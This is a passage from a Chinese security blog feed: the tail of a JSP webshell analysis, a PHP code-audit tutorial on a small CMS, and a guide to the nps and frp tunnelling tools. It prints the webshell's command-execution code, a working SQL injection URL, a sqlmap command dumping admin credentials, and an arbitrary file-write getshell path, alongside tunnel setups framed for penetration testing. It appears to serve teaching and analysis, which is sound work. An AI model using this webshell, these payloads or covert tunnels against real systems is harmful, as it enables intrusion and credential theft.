class="string">&quot;1&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;F&quot;</span>)) &#123;</span><br><span class="line">            FF(z1, response);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;G&quot;</span>)) &#123;</span><br><span class="line">            GG(z1, z2);</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;H&quot;</span>)) &#123;</span><br><span class="line">            HH(z1, z2);</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;I&quot;</span>)) &#123;</span><br><span class="line">            II(z1, z2);</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;J&quot;</span>)) &#123;</span><br><span class="line">            JJ(z1);</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;K&quot;</span>)) &#123;</span><br><span class="line">            KK(z1, z2);</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;L&quot;</span>)) &#123;</span><br><span class="line">            LL(z1, z2);</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;M&quot;</span>)) &#123;</span><br><span class="line">            String[] c = &#123; z1.substring(<span class="number">2</span>), z1.substring(<span class="number">0</span>, <span class="number">2</span>), z2 &#125;;</span><br><span class="line">            Process p = Runtime.getRuntime().exec(c);</span><br><span class="line">            MM(p.getInputStream(), sb);</span><br><span class="line">            MM(p.getErrorStream(), sb);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;N&quot;</span>)) &#123;</span><br><span class="line">            NN(z1, sb);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;O&quot;</span>)) &#123;</span><br><span class="line">            OO(z1, sb);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;P&quot;</span>)) &#123;</span><br><span class="line">            PP(z1, sb);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;Q&quot;</span>)) &#123;</span><br><span class="line">            QQ(cs, z1, z2, sb);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;<span class="comment">// 其他情况出现错误时，显示错误原因</span></span><br><span class="line">        sb.append(<span class="string">&quot;ERROR&quot;</span> + <span class="string">&quot;:// &quot;</span> + e.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    sb.append(<span class="string">&quot;|&quot;</span> + <span class="string">&quot;&lt;-&quot;</span>);<span class="comment">// 结尾的｜&lt;-</span></span><br><span class="line">    out.print(sb.toString());</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>攻击者可以通过菜刀蚁剑等shell连接工具，对该webshell进行利用，</p><p><img src="http://image.v0w.top/Blog/2020-09-02-024309.png"></p><p>也可以直接利用函数中的参数进行利用：</p><p>比如通过<code>QWEasd123=A</code>调用webshell列目录的功能：</p><p><img src="http://image.v0w.top/Blog/2020-09-02-024714.jpg"></p><p>再如：<code>QWEasd123=B&amp;z1=/</code>列出指定目录的文件和读写权限。</p><p><img src="http://image.v0w.top/Blog/2020-09-02-025317.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;今天突然接到一个任务，称客户需要分析一个webshell，于是放在手边的工作来看一看，发现这是一个j</summary>
      
    
    
    
    <category term="代码审计" scheme="http://v0w.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="webshell" scheme="http://v0w.top/tags/webshell/"/>
    
    <category term="Java" scheme="http://v0w.top/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>代码审计常见的三种方法（PHP篇）</title>
    <link href="http://v0w.top/2020/08/26/CodeAudit-php/"/>
    <id>http://v0w.top/2020/08/26/CodeAudit-php/</id>
    <published>2020-08-25T16:00:00.000Z</published>
    <updated>2020-09-02T09:01:22.433Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>之前也做过一些代码审计，主要语言是PHP，大部分情况下，都是东一榔头西一棒，非常不优雅，甚至有时为了找一个功能点的代码，翻来倒去很久，浪费时间。偶然看见<a href="https://www.sqlsec.com/2020/07/macphp.html">国光0rz的php代码审计环境的搭建</a>，在搭建完之后，我又尝试对<a href="https://www.sqlsec.com/2020/01/sinsiu.html">国光大佬0rz分析过了的一个企业建站系统</a>进行简单复现，得益于代码审计环境尤其是PHP调试环境的搭建，我很快就可以定位到功能点的具体代码，大大缩短寻找功能点代码的时间，提高审计效率。于是记录一下现在的一个审计过程。文章偏小白，大佬轻喷0rz。</p><h1 id="0x01-环境准备"><a href="#0x01-环境准备" class="headerlink" title="0x01 环境准备"></a>0x01 环境准备</h1><p>环境准备方面，前人之述备矣。参考：</p><p><a href="https://www.sqlsec.com/2020/07/macphp.html">macOS 下优雅地配置 PHP 代码审计环境</a></p><p>环境解决之后，接下来本菜鸡将以新秀企业建站系统为例简述现在的代码审计流程。</p><p>参考链接：<a href="https://www.sqlsec.com/2020/01/sinsiu.html">PHP代码审计初次尝试之新秀企业网站系统</a></p><h1 id="0x02-从代码本身找漏洞"><a href="#0x02-从代码本身找漏洞" class="headerlink" title="0x02 从代码本身找漏洞"></a>0x02 从代码本身找漏洞</h1><p>不知道大家在进行白盒测试的时候，一般使用什么样的方式。我之前一般就比较无脑，直接seay师傅的代码审计工具一上，然后对其检测出来的问题点，挨个查看，再找相应的功能点进行验证。这种方式可能确实能发现很多问题，但是由于seay代码审计工具，是通过找危险函数来判断是否为漏洞点，所以存在<strong>误报率很高的问题</strong>。另一方面，通过代码，想去<strong>反过来找到对应的功能点位置</strong>，实际上是比较<strong>难</strong>的。</p><p>同样的自动化代码审计工具有：</p><ul><li>Seay源代码审计系统</li><li>Fortify SCA</li><li>RIPS</li></ul><p>以Seay源代码审计系统为例：</p><p><img src="http://image.v0w.top/Blog/2020-09-02-082635.png"></p><p>由于Seay审计工具以及类似产品的原理是通过规则匹配，查找可能存在问题和漏洞的点，比较好的是可以很快的给我列出很多可能存在漏洞的点。</p><p>但是有两个问题比较难以解决：</p><ol><li>如何通过这些代码的位置定位到功能点的位置。</li><li>规则匹配导致输出的漏洞点数量远远大于实际的风险漏洞的数量，需要消耗大量的精力复现和筛选，大部分时间都浪费在人工消除误报。</li></ol><p>基于以上两个原因，我开始尝试<strong>从功能点+调试的方式来找漏洞</strong>。</p><h1 id="0x03-从功能点调试的方式找漏洞"><a href="#0x03-从功能点调试的方式找漏洞" class="headerlink" title="0x03 从功能点调试的方式找漏洞"></a>0x03 从功能点调试的方式找漏洞</h1><p>所谓从功能点来找漏洞，顾名思义，就是通过搭建一个完整的环境（比如CMS等建站系统的环境），然后<strong>对常见的功能点进行测试，通过调试的方式来找到对应功能点的源码</strong>。在对源码进行审计，这样我们可以<strong>较为轻松的定位功能点和具体代码的对应关系，对整个代码的逻辑有更为清楚的认识</strong>。</p><p>以新秀企业建站系统为例，讲一讲如何通过调试方式对特定功能点进行检查，确认其是否存在漏洞。</p><h2 id="3-1-admin页面是否存在SQL注入"><a href="#3-1-admin页面是否存在SQL注入" class="headerlink" title="3.1 admin页面是否存在SQL注入"></a>3.1 admin页面是否存在SQL注入</h2><p>admin页面，通过<code>MySQLMonitor</code>监听SQL语句的执行情况，找到账号登录时的SQL语句。</p><p><img src="http://image.v0w.top/Blog/2020-08-27-035352.png"></p><p>通过对这个SQL语句的一部分进行全project搜索，找到相应的代码点。</p><p><img src="http://image.v0w.top/Blog/2020-08-27-040600.jpg"></p><p><strong>注意：此时的代码可能不是最终的SQL语句执行的代码点</strong>，但是没有关系，我们可以在这里下断点，然后在浏览器里执行相应的操作，比如我们这里是输入账号密码，登录。</p><p><img src="http://image.v0w.top/Blog/2020-08-27-035518.jpg"></p><p>之后，因为下了断点，开启xdebug监听，我们可以step in，然后之后找到相应的SQL语句的位置，再对其源码进行审计。</p><p><img src="http://image.v0w.top/Blog/2020-08-27-030634.jpg"></p><p>此处，明显还是使用了SQL语句的拼接，这个可能是存在问题的，但是是否存在SQL注入漏洞，我们还需要进一步验证。</p><p>比如我们这样：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username &#x3D; admin&#39; and sleep(2)#</span><br><span class="line">password &#x3D; 123</span><br></pre></td></tr></table></figure><p><img src="http://image.v0w.top/Blog/2020-08-27-042319.png"></p><p>结果发现好像<code>&#39;</code>被转义了。</p><p>我们可以将断点往前面放一点：</p><p>发现这个小小的企业建站系统，竟然还做了不错的安全限制。</p><p>1.<code>include/function.php:426</code> safe函数对攻击IP封禁一段时间。</p><p><img src="http://image.v0w.top/Blog/2020-08-27-055339.png"></p><p>2.<code>include/function.php:74</code> strict函数将一些危险字符替换成对应的HTML实体，确实可以防护很多的SQL注入攻击。</p><p><img src="http://image.v0w.top/Blog/2020-08-27-055047.png"></p><p>然后我们就可以确认，admin的登录点不存在SQL注入。</p><p>其他的功能点也是一样，可以通过调试方式，非常轻松地定位到代码，然后审计一下代码的逻辑和危险函数的使用是否存在问题，基本上，所有功能点过一遍就差不多了。当然，全部过一遍之后，还可以再结合seay审计工具来查漏补缺一下。</p><p>我们再举一两个例子。</p><h2 id="3-2-前台搜索功能点SQL注入漏洞"><a href="#3-2-前台搜索功能点SQL注入漏洞" class="headerlink" title="3.2 前台搜索功能点SQL注入漏洞"></a>3.2 前台搜索功能点SQL注入漏洞</h2><p>先输入一个关键词，利用MySQLMonitor定位SQL语句。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;sinsiu:8888&#x2F;?&#x2F;search&#x2F;index.html&#x2F;key-TEST&#x2F;</span><br></pre></td></tr></table></figure><p>找到测试的关键词，找到相应的SQL语句。</p><p><img src="http://image.v0w.top/Blog/2020-08-27-073347.png"></p><p>对SQL语句的一部分进行全project的搜索，定位一下：</p><p><img src="http://image.v0w.top/Blog/2020-08-27-073906.jpg"></p><p>下断点，执行看看：</p><p>发现<code>index/module/search_main.php:2:module_search_main()函数</code>这里是SQL语句直接拼接了，而且不像之前经过过滤。</p><p><img src="http://image.v0w.top/Blog/2020-08-27-074311.png"></p><p>于是我们就有了这样的结果：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;sinsiu:8888&#x2F;?&#x2F;search&#x2F;index.html&#x2F;key-%27UNION%20ALL%20SELECT%20NULL,NULL,database()--%20-</span><br></pre></td></tr></table></figure><p><img src="http://image.v0w.top/Blog/2020-08-27-085057.png"></p><p>确定这里存在SQL注入之后，就可以通过sqlmap来进行利用。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 sqlmap.py -u &quot;http:&#x2F;&#x2F;sinsiu:8888&#x2F;?&#x2F;search&#x2F;index.html&#x2F;key-%27*%20%23&#x2F;&quot; -v 3 -D susiu -T php_admin -C adm_id,adm_username,adm_password --dump</span><br></pre></td></tr></table></figure><p><img src="http://image.v0w.top/Blog/2020-08-27-085356.png"></p><p>我们很轻松的找到（fu xian）了一个漏洞。</p><h2 id="3-3-后台语言设置Getshell"><a href="#3-3-后台语言设置Getshell" class="headerlink" title="3.3 后台语言设置Getshell"></a>3.3 后台语言设置Getshell</h2><p>看了上面的两个例子，那么问题来了，如果说一个功能点他不直接和数据库交互，我们如何通过功能点来定位代码呢？</p><p>我的方法是，搜索一些特定字符串，听上去很傻，但是往往挺有效果的。</p><p>比如我们怀疑后台编辑语言文件的位置存在任意文件写入的问题导致getshell。</p><p><img src="http://image.v0w.top/Blog/2020-08-28-012116.jpg"></p><p>那我们可以去搜索<strong>编辑语言包成功</strong>。在搜索一些关键词时，如果直接搜可能找不到，可以使用模糊查询或者正则表达式查询。</p><p><img src="http://image.v0w.top/Blog/2020-08-28-012211.jpg"></p><p>前后结合一下，能够找到写文件的位置。之后，设置断点，进行测试，而且比较清晰的看到代码的执行过程。</p><p><img src="http://image.v0w.top/Blog/2020-08-28-014140.jpg"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$path = post(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line">$lang_text = post(<span class="string">&#x27;lang_text&#x27;</span>,<span class="string">&#x27;no_filter&#x27;</span>);</span><br><span class="line">file_put_contents($path,$lang_text);</span><br></pre></td></tr></table></figure><p><code>$path</code>过了<code>strict</code>过滤器，<code>$lang_text</code>文件内容过了<code>no_filter</code>过滤器。</p><p><code>no_filter</code>过滤器就转义了一下，几乎相当于没有过滤，我们就可以任意文件写入。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//不过滤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">no_filter</span>(<span class="params">$str</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(S_MAGIC_QUOTES_GPC)</span><br><span class="line">&#123;</span><br><span class="line">$str = stripslashes($str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$path</code>也是可控的，所以就可以很轻松的写入shell。</p><p><img src="http://image.v0w.top/Blog/2020-08-28-014316.jpg"></p><p>当然，该方法虽然一般情况下的表现不错。但是，相比于通过seay审计工具挨个去看危险函数，<strong>该方法对源码的整体性以及漏洞的挖掘程度并不够</strong>。</p><h1 id="0x04-整体阅读代码"><a href="#0x04-整体阅读代码" class="headerlink" title="0x04 整体阅读代码"></a>0x04 整体阅读代码</h1><p>这种方法比较硬核。。。</p><p>本人尚菜，很少尝试这样去审计一个系统。</p><p>当然，对于一个比较小的系统，或者类似于CTF中的代码审计，可能只是有一个场景，<strong>整体代码量较小的情况</strong>下，会是非常不错的方式。不仅可以较为深入的挖掘漏洞，还可以较为深入的挖掘漏洞的成因，利用方式。比如比较流行的<strong>php反序列化的POP利用链</strong>。</p><h1 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h1><p>本文总结了php代码审计的常见三种方法。并以新秀企业建站系统为例，详细实战了功能点调试的方式找漏洞的方法：</p><ol><li>代码本身找漏洞</li><li>通过功能点调试的方式找漏洞</li><li>整体阅读代码找漏洞</li></ol><p>希望对读者在代码审计的入门有帮助。祝福各位师傅早日挖到属于自己的洞。</p><h1 id="0xFF-参考链接"><a href="#0xFF-参考链接" class="headerlink" title="0xFF 参考链接"></a>0xFF 参考链接</h1><ul><li><a href="https://www.sqlsec.com/2020/07/macphp.html">国光——macOS 下优雅地配置 PHP 代码审计环境</a></li><li><a href="https://www.sqlsec.com/2020/01/sinsiu.html">国光——PHP代码审计初次尝试之新秀企业网站系统</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;之前也做过一些代码审计，主要语言是PHP，大部分情况下，都是东一榔头西一棒，非常不优雅，甚至有时为了</summary>
      
    
    
    
    <category term="漏洞挖掘" scheme="http://v0w.top/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    
    <category term="php" scheme="http://v0w.top/tags/php/"/>
    
    <category term="代码审计" scheme="http://v0w.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>常见内网穿透工具使用总结</title>
    <link href="http://v0w.top/2020/08/11/IntranetProxy/"/>
    <id>http://v0w.top/2020/08/11/IntranetProxy/</id>
    <published>2020-08-10T16:00:00.000Z</published>
    <updated>2020-09-07T08:00:32.102Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>本文以渗透的视角，总结几种个人常用的内网穿透，内网代理工具，介绍其简单原理和使用方法。</p><h1 id="0x01-nps-npc"><a href="#0x01-nps-npc" class="headerlink" title="0x01 nps-npc"></a>0x01 nps-npc</h1><h2 id="1-1-简介"><a href="#1-1-简介" class="headerlink" title="1.1 简介"></a>1.1 简介</h2><blockquote><p>nps是一款轻量级、高性能、功能强大的<strong>内网穿透</strong>代理服务器。目前支持<strong>tcp、udp流量转发</strong>，可支持任何<strong>tcp、udp</strong>上层协议（访问内网网站、本地支付接口调试、ssh访问、远程桌面，内网dns解析等等……），此外还<strong>支持内网http代理、内网socks5代理</strong>、<strong>p2p等</strong>，并带有功能强大的web管理端。</p></blockquote><ul><li>一台有公网IP的服务器（VPS）运行服务端（<strong>NPS</strong>）</li><li>一个或多个运行在内网的服务器或者PC运行客户端（<strong>NPC</strong>）</li></ul><p><img src="http://image.v0w.top/Blog/2020-09-07-044750.jpg"></p><h2 id="1-2-特点"><a href="#1-2-特点" class="headerlink" title="1.2 特点"></a>1.2 特点</h2><ol><li>Go语言编写</li><li>支持跨平台</li><li>支持多种协议的代理</li><li>web管理端</li></ol><h2 id="1-3-使用方法"><a href="#1-3-使用方法" class="headerlink" title="1.3 使用方法"></a>1.3 使用方法</h2><p><a href="https://github.com/ehang-io/nps/releases">https://github.com/ehang-io/nps/releases</a></p><h3 id="NPS"><a href="#NPS" class="headerlink" title="NPS"></a>NPS</h3><h4 id="安装配置"><a href="#安装配置" class="headerlink" title="安装配置"></a>安装配置</h4><p>找到自己服务器相应版本的server：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd ~</span><br><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;cnlh&#x2F;nps&#x2F;releases&#x2F;download&#x2F;v0.23.2&#x2F;linux_amd64_server.tar.gz</span><br><span class="line">tar xzvf linux_amd64_server.tar.gz</span><br><span class="line">cd ~&#x2F;nps</span><br></pre></td></tr></table></figure><p>在nps目录下面会有一个nps可执行文件、conf配置目录和web网页目录，我们只需要修改<code>conf/nps.conf</code>即可：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim conf&#x2F;nps.conf</span><br></pre></td></tr></table></figure><p>需要改一下<code>#web</code>下面的几个参数，</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">web_host&#x3D; 服务器IP或者域名</span><br><span class="line">web_username&#x3D; admin（登录用户名）</span><br><span class="line">web_password&#x3D; 你的密码</span><br><span class="line">web_port&#x3D;8080（web管理端口）</span><br></pre></td></tr></table></figure><p>修改<code>#bridge</code> 可以更改 NPC的连接端口。比如我们拿到一台权限受限的服务器，有防火墙，可能只有部分端口（80，443）可以出网，就需要修改成出网端口。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">##bridge</span><br><span class="line">bridge_type&#x3D;tcp</span><br><span class="line">bridge_port&#x3D;443# 修改连接端口</span><br><span class="line">bridge_ip&#x3D;0.0.0.0</span><br></pre></td></tr></table></figure><h4 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#Mac&#x2F;Linux</span><br><span class="line">.&#x2F;nps test|start|stop|restart|status  测试配置文件|启动|停止|重启|状态</span><br><span class="line"></span><br><span class="line">#Windows</span><br><span class="line">nps.exe test|start|stop|restart|status 测试配置文件|启动|停止|重启|状态</span><br></pre></td></tr></table></figure><h3 id="NPC"><a href="#NPC" class="headerlink" title="NPC"></a>NPC</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;npc -server&#x3D;你的IP:8024 -vkey&#x3D;唯一验证密码 -type&#x3D;tcp</span><br></pre></td></tr></table></figure><p><img src="http://image.v0w.top/Blog/2020-09-07-024103.png"></p><p>​    </p><p>新建好客户端后，也可以在<code>+</code>中看到，详细的客户端连接命令：</p><p><img src="http://image.v0w.top/Blog/2020-09-07-043729.jpg"></p><h3 id="web管理端"><a href="#web管理端" class="headerlink" title="web管理端"></a>web管理端</h3><p>在客户端界面可以通过<code>新增</code>的方式添加客户端连接，每一个连接的vkey都是唯一区分的。</p><p>每一个客户端，在建立连接后，都可以建立多个不同协议的隧道，这一个个隧道就是不同的代理了。</p><p><img src="http://image.v0w.top/Blog/2020-09-07-044514.jpg"></p><p>通过不同的协议和端口就可以连接代理的内网机器。</p><h1 id="0x02-frp"><a href="#0x02-frp" class="headerlink" title="0x02 frp"></a>0x02 frp</h1><h2 id="2-1-简介"><a href="#2-1-简介" class="headerlink" title="2.1 简介"></a>2.1 简介</h2><blockquote><p>frp 是一个专注于内网穿透的高性能的反向代理应用，支持 TCP、UDP、HTTP、HTTPS 等多种协议。可以将内网服务以安全、便捷的方式通过具有公网 IP 节点的中转暴露到公网。</p></blockquote><p><img src="http://image.v0w.top/Blog/2020-09-07-051644.jpg"></p><h2 id="2-2-特点"><a href="#2-2-特点" class="headerlink" title="2.2 特点"></a>2.2 特点</h2><ul><li>客户端服务端通信支持 TCP、KCP 以及 Websocket 等多种协议。</li><li>端口复用，多个服务通过同一个服务端端口暴露。</li><li>跨平台，但是支持的比nps少一点</li><li>多种插件，提供很多功能</li></ul><h2 id="2-3-使用方法"><a href="#2-3-使用方法" class="headerlink" title="2.3 使用方法"></a>2.3 使用方法</h2><p>下载：<a href="https://github.com/fatedier/frp/releases">https://github.com/fatedier/frp/releases</a></p><blockquote><p>以下内容摘自：<a href="https://segmentfault.com/a/1190000021876836">https://segmentfault.com/a/1190000021876836</a></p></blockquote><h3 id="1-通过-rdp-访问家里的机器"><a href="#1-通过-rdp-访问家里的机器" class="headerlink" title="1. 通过 rdp 访问家里的机器"></a>1. 通过 rdp 访问家里的机器</h3><ol><li><p>修改 frps.ini 文件，为了安全起见，这里最好配置一下身份验证，服务端和客户端的 common 配置中的 <code>token</code> 参数一致则身份验证通过：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># frps.ini</span><br><span class="line">[common]</span><br><span class="line">bind_port &#x3D; 7000</span><br><span class="line"># 用于身份验证，请自行修改，要保证服务端与客户端一致</span><br><span class="line">token &#x3D; abcdefgh</span><br></pre></td></tr></table></figure></li><li><p>启动 frps：</p><p><code>./frps -c ./frps.ini</code></p></li><li><p>修改 frpc.ini 文件，假设 frps 所在服务器的公网 IP 为 x.x.x.x：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># frpc.ini</span><br><span class="line">[common]</span><br><span class="line">server_addr &#x3D; x.x.x.x</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line"># 用于身份验证，请自行修改，要保证服务端与客户端一致</span><br><span class="line">token &#x3D; abcdefgh</span><br><span class="line"></span><br><span class="line">[rdp]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">local_ip &#x3D; 127.0.0.1</span><br><span class="line">local_port &#x3D; 3389</span><br><span class="line">remote_port &#x3D; 6000</span><br></pre></td></tr></table></figure></li><li><p>启动 frpc：</p><p><code>./frpc -c ./frpc.ini</code></p></li><li><p>通过 rdp 访问远程的机器，地址为：</p><p><code>x.x.x.x:6000</code></p></li></ol><h4 id="开机自启"><a href="#开机自启" class="headerlink" title="开机自启"></a>开机自启</h4><p>针对 Windows 系统，为了便于使用，可以配置一下开机的时候静默启动。</p><ol><li><p>在 frpc.exe 的同级目录创建一个 start_frpc.vbs：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;start_frpc.vbs</span><br><span class="line">&#39;请根据实际情况修改路径</span><br><span class="line">CreateObject(&quot;WScript.Shell&quot;).Run &quot;&quot;&quot;D:\Program Files\frp_windows_amd64\frpc.exe&quot;&quot;&quot; &amp; &quot;-c&quot; &amp; &quot;&quot;&quot;D:\Program Files\frp_windows_amd64\frpc.ini&quot;&quot;&quot;,0</span><br></pre></td></tr></table></figure></li><li><p>复制 start_frpc.vbs 文件，打开以下目录，注意将</p></li></ol>   <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;USER_NAME&gt;</span><br></pre></td></tr></table></figure><p>   改为你的用户名：</p><p>   <code>C:\Users\&lt;USER_NAME&gt;\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code></p><ol start="3"><li>鼠标右击，粘贴为快捷方式即可。</li></ol><h3 id="2-通过-SSH-访问公司内网机器"><a href="#2-通过-SSH-访问公司内网机器" class="headerlink" title="2. 通过 SSH 访问公司内网机器"></a>2. 通过 SSH 访问公司内网机器</h3><p>frps 的部署步骤同上。</p><ol><li><p>启动 frpc，配置如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># frpc.ini</span><br><span class="line">[common]</span><br><span class="line">server_addr &#x3D; x.x.x.x</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line"># 用于身份验证，请自行修改，要保证服务端与客户端一致</span><br><span class="line">token &#x3D; abcdefgh</span><br><span class="line"></span><br><span class="line">[ssh]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">local_ip &#x3D; 127.0.0.1</span><br><span class="line">local_port &#x3D; 22</span><br><span class="line">remote_port &#x3D; 6000</span><br></pre></td></tr></table></figure></li><li><p>通过 SSH 访问内网机器，假设用户名为 test：</p><p><code>ssh -oPort=6000 test@x.x.x.x</code></p></li></ol><h3 id="3-通过自定义域名访问部署于内网的-Web-服务"><a href="#3-通过自定义域名访问部署于内网的-Web-服务" class="headerlink" title="3. 通过自定义域名访问部署于内网的 Web 服务"></a>3. 通过自定义域名访问部署于内网的 Web 服务</h3><p>有时想要让其他人通过域名访问或者测试我们在本地搭建的 Web 服务，但是由于本地机器没有公网 IP，无法将域名解析到本地的机器，通过 frp 就可以实现这一功能，以下示例为 http 服务，https 服务配置方法相同， vhost_http_port 替换为 vhost_https_port， type 设置为 https 即可。</p><ol><li><p>修改 frps.ini 文件，设置 http 访问端口为 8080：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># frps.ini</span><br><span class="line">[common]</span><br><span class="line">bind_port &#x3D; 7000</span><br><span class="line">vhost_http_port &#x3D; 8080</span><br><span class="line"># 用于身份验证，请自行修改，要保证服务端与客户端一致</span><br><span class="line">token &#x3D; abcdefgh</span><br></pre></td></tr></table></figure></li><li><p>启动 frps：</p><p><code>./frps -c ./frps.ini</code></p></li><li><p>修改 frpc.ini 文件，假设 frps 所在的服务器的 IP 为 x.x.x.x，local_port 为本地机器上 Web 服务对应的端口， 绑定自定义域名 <code>www.yourdomain.com</code>:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># frpc.ini</span><br><span class="line">[common]</span><br><span class="line">server_addr &#x3D; x.x.x.x</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line"># 用于身份验证，请自行修改，要保证服务端与客户端一致</span><br><span class="line">token &#x3D; abcdefgh</span><br><span class="line"></span><br><span class="line">[web]</span><br><span class="line">type &#x3D; http</span><br><span class="line">local_port &#x3D; 80</span><br><span class="line">custom_domains &#x3D; www.yourdomain.com</span><br></pre></td></tr></table></figure></li><li><p>启动 frpc：</p><p><code>./frpc -c ./frpc.ini</code></p></li><li><p>将 <code>www.yourdomain.com</code> 的域名 A 记录解析到 IP <code>x.x.x.x</code>，如果服务器已经有对应的域名，也可以将 CNAME 记录解析到服务器原先的域名。</p></li><li><p>通过浏览器访问 <code>http://www.yourdomain.com:8080</code> 即可访问到处于内网机器上的 Web 服务。</p></li></ol><h3 id="4-对外提供简单的文件访问服务"><a href="#4-对外提供简单的文件访问服务" class="headerlink" title="4. 对外提供简单的文件访问服务"></a>4. 对外提供简单的文件访问服务</h3><p>通过 <code>static_file</code> 插件可以对外提供一个简单的基于 HTTP 的文件访问服务。</p><p>frps 的部署步骤同上。</p><ol><li><p>启动 frpc，启用 <code>static_file</code> 插件，配置如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># frpc.ini</span><br><span class="line">[common]</span><br><span class="line">server_addr &#x3D; x.x.x.x</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line"># 用于身份验证，请自行修改，要保证服务端与客户端一致</span><br><span class="line">token &#x3D; abcdefgh</span><br><span class="line"></span><br><span class="line">[test_static_file]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">remote_port &#x3D; 6000</span><br><span class="line">plugin &#x3D; static_file</span><br><span class="line"># 要对外暴露的文件目录</span><br><span class="line">plugin_local_path &#x3D; &#x2F;tmp&#x2F;file</span><br><span class="line"># 访问 url 中会被去除的前缀，保留的内容即为要访问的文件路径</span><br><span class="line">plugin_strip_prefix &#x3D; static</span><br><span class="line">plugin_http_user &#x3D; abc</span><br><span class="line">plugin_http_passwd &#x3D; abc</span><br></pre></td></tr></table></figure></li><li><p>通过浏览器访问 <code>http://x.x.x.x:6000/static/</code> 来查看位于 <code>/tmp/file</code> 目录下的文件，会要求输入已设置好的用户名和密码。</p></li></ol><h2 id="常用功能"><a href="#常用功能" class="headerlink" 